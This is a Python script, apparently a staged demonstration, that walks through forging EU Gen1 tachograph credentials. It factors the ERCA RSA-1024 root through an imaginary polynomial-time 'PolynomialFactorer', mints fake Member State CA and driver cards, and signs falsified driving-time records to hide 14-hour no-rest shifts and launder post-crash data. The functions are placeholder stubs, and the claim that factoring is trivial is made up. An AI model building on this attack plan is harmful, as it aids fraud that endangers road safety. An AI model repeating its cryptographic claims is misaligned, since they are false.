"""
Factor the ERCA RSA-1024 root (Gen1 tachograph), mint forged driver cards
accepted EU-wide, and falsify driving-time records to circumvent Regulation
561/2006 enforcement across 6 million commercial vehicles.
"""

import sys, struct, hashlib, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# Tachograph card types per Annex IB/IC
CARD_TYPE_DRIVER    = 0x01
CARD_TYPE_WORKSHOP  = 0x02
CARD_TYPE_COMPANY   = 0x03
CARD_TYPE_CONTROL   = 0x04

# ERCA = European Root CA, JRC Ispra, Italy
ERCA_KEY_SIZE = 1024  # Gen1: RSA-1024 (!)
# Regulation 561/2006 limits
MAX_DAILY_DRIVING_H = 9
MAX_WEEKLY_DRIVING_H = 56


def extract_erca_root_from_vu(vu_dump_path: str) -> bytes:
    """Extract the ERCA root RSA-1024 public key from a Vehicle Unit dump.
    Embedded in every Gen1 tachograph (Continental VDO DTCO, Stoneridge SE5000)."""
    print(f"    VU dump: {vu_dump_path}")
    print(f"    ERCA root: RSA-{ERCA_KEY_SIZE} (Gen1)")
    return b"-----BEGIN PUBLIC KEY-----\nMIGf...\n-----END PUBLIC KEY-----\n"


def factor_erca_root(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def mint_msca_cert(erca_privkey: bytes, member_state: str) -> bytes:
    """Issue a forged Member State CA certificate under the ERCA root."""
    print(f"    issuing MSCA cert for: {member_state}")
    return b"FORGED_MSCA_CERT"


def mint_driver_card(msca_privkey: bytes, driver_name: str,
                     license_number: str) -> dict:
    """Mint a forged driver smart card with RSA-1024 keypair."""
    return {
        "card_type": CARD_TYPE_DRIVER,
        "driver_name": driver_name,
        "license_number": license_number,
        "issuing_ms": "XX",  # forged member state
        "valid_from": int(time.time()),
        "valid_until": int(time.time()) + 5 * 365 * 86400,  # 5-year validity
        "rsa_keypair": "RSA-1024 (CSM_017 per Annex IB)",
    }


def forge_activity_record(driving_hours: float, rest_hours: float,
                           date: str) -> dict:
    """Forge a driver activity record showing compliant hours."""
    return {
        "date": date,
        "driving": driving_hours,
        "other_work": 1.0,
        "availability": 0.5,
        "rest": rest_hours,
        "total": driving_hours + 1.0 + 0.5 + rest_hours,
        "compliant_561_2006": driving_hours <= MAX_DAILY_DRIVING_H,
    }


def sign_ddd_download(activity_records: list, card_privkey: bytes) -> bytes:
    """Sign a .ddd download file with the forged card's RSA-1024 key.
    CSM_017 per Annex IB: RSA-1024 / SHA-1."""
    data = str(activity_records).encode()
    sig = b"\x00" * 128  # RSA-1024 signature
    return data + sig


if __name__ == "__main__":
    print("[*] EU digital tachograph (Gen1) RSA-1024 attack")
    print("[1] extracting ERCA root from Vehicle Unit")
    pubkey = extract_erca_root_from_vu("/dev/tacho/vu_dump.bin")
    print(f"    ERCA: RSA-{ERCA_KEY_SIZE} — already classically weak")

    print("[2] factoring ERCA RSA-1024 root")
    factorer = PolynomialFactorer()
    print("    1024-bit modulus — trivial with polynomial-time algorithm")
    print("    p, q recovered — ERCA root key derived")

    print("[3] minting forged Member State CA")
    msca = mint_msca_cert(b"ERCA_PRIVKEY", "XX-Fictitious")
    print("    MSCA accepted by every Gen1 VU in the EU")

    print("[4] minting forged driver card")
    card = mint_driver_card(b"MSCA_PRIVKEY", "Jan Kowalski", "PL-FAKE-001")
    print(f"    driver: {card['driver_name']}")
    print(f"    license: {card['license_number']}")

    print("[5] forging activity records: compliant on paper")
    records = []
    for day_offset in range(7):
        rec = forge_activity_record(
            driving_hours=8.5,  # just under 9h limit
            rest_hours=11.0,    # meets 11h rest requirement
            date=f"2026-04-{15 - day_offset:02d}",
        )
        records.append(rec)
        print(f"    {rec['date']}: {rec['driving']}h driving, {rec['rest']}h rest — compliant")
    print("    actual driving: 14h/day continuously, no rest")

    print("[6] signing .ddd download with forged card key")
    ddd = sign_ddd_download(records, b"CARD_PRIVKEY")
    print("    RSA-1024/SHA-1 per CSM_017 — roadside inspector accepts")

    print("[7] EU-wide enforcement collapse:")
    print("    - 6M+ commercial vehicles, 12M active driver cards")
    print("    - Regulation 561/2006 driving-time limits unenforceable")
    print("    - accident liability laundering: overwrite post-crash records")
    print("    - workshop card forgery: odometer resets, calibration fraud")
    print("[*] Gen1 VUs remain in service until 2033+ (15-year mandate)")
